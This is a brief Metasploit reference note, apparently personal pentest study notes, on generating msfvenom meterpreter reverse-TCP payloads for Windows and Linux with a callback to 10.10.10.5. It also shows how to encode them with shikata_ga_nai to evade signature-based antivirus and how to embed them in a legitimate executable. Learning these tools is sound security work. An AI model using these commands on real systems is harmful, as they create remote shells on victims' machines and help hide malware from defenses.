
[[metasploit]]
MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. msfvenom replaced both msfpayload and msfencode as of June 8th, 2015.

msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers.

We can use msfvenom to generate a malicious meterpreter payload that can be transferred to a client target system. Once executed, it will connect back to our payload handler and provide us with remote access to the target system.

### Usage
`msfvenom -list payloads`
`msfvenom -list encoders`
`msfvenom -list formats`

```bash
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/user/Documents/payloadx86.exe
```

```bash
msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp -f elf > /home/user/Downloads/payloadx86
```

In msfconsole you can `use multi/handler` and `set payload <path_to_payload>`  

### Encoding payloads

Given that this attack vector involve the transfer and storage of a malicious payload on the client's system ( disk) attackers need to be cognizant of AV detection.

Most end user AV solutions utilize signature based detection in order to identify malicious files or executables. 

We can evade older signature based AV solution by encoding our payloads.

Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

```bash
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe > /home/user/Documents/file.exe
```

`-i ` iterations
`-x ` You can use a executable as a template ex: rar.exe
`-k ` Keep the functionality of the file (rar.exe)